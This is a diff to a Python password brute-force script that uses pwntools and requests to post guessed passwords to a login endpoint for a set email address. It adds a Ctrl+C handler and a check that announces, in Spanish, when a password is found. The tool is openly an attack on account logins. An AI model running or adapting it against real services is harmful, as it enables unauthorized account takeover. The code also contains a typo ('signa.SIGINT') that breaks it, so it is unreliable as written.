@@ -3,7 +3,15 @@
 
 
 from pwn import *
-import requests, random , time
+from termcolor import colored
+import requests, random , time, signal, sys
+
+def def_handrel(sig, frame):
+    print(colored(f"\n\n[!] Saliendo......\n", "red"))
+    sys.exit(1)
+
+signal.signal(signa.SIGINT, def_handrel) #manejo del Ctrl + c
+
 main_url = "" #endpoint
 email = "planbkid@gmail.com"
 
@@ -30,8 +38,9 @@ def bruteforce():
 
         r = requests.post(main_url, json= post_data, headers=headers)
 
-        print(r.text)
-
+        if "false" not in r.text:
+            p1.success(f"Contraseña encontrada: {password.strip()}")
+            break
 def main():
     bruteforce()
 
